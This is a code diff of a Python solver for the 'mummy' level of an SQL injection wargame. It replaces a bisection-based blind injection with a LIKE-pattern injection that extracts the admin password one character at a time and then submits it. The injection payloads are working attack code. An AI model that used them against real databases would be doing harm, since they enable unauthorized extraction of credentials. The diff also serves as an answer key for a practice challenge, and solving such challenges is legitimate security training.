@@ -7,7 +7,16 @@ def check_func(*args) -> bool:
     check string in response of request
     args[0]: response
     '''
-    return 'login success!' in args[0]
+    return 'Hello anonymous' in args[0]
+
+
+def FindPw(pw, url, cook):
+    for i in range(48, 128):
+        payload = "*from[prob_mummy]where[id]='admin'and[pw]like'%s'"
+        param = dict(query=payload % (pw + chr(i) + '%'))
+        response = los.get_request(url, param, cook)
+        if check_func(response):
+            return chr(i)
 
 
 def main():
@@ -29,24 +38,15 @@ def main():
     url = "https://los.rubiya.kr/chall/mummy_2e13c2a4483d845ce2d37f7c910f0f83.php"
     cook = los.check_cookies(url)
 
-    param = dict(pw="' or length(pw)>%s-- ")
-    len_of_key = los.find_key_len(url, param, check_func, cook)
-
-    print(len_of_key)
-
     result = ''
-    num_of_requests = 0
-    for i in range(1, len_of_key + 1):
-        param = dict(pw=f"' or unicode(substr(pw,{i},1))<%s-- ")
-        left, num_requests = los.find_binary(url, param, check_func,
-                                             32, 127, cook)
-        print(chr(left))
-        result += chr(left)
-        num_of_requests += num_requests
+    while True:
+        try:
+            result += FindPw(result, url, cook)
+            print('result', result)
+        except:
+            break
 
-    print('num_of_requests:', num_of_requests)
-
-    param = dict(pw=result)
+    param = dict(pw=result.lower())
     response = los.get_request(url, param, cook)
 
     if 'Clear!' in response:
